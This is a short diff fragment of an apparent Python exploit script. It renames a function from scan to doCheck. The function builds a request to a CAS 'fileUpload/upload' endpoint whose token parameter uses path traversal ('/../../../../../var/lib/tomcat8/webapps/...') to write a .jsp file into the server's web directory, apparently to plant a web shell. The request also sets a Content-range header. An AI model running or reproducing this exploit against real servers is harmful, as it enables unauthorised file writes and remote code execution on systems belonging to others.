@@ -14,7 +14,7 @@ def randomLowercase(n):
     key+=zf[suiji1]
   return key
 rand=randomLowercase(10)
-def scan(baseurl):
+def doCheck(baseurl):
   url = baseurl+ "cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/" + str(r2) + ".jsp&name=222"
   headers={
   "Content-range": "bytes 0-10/20",
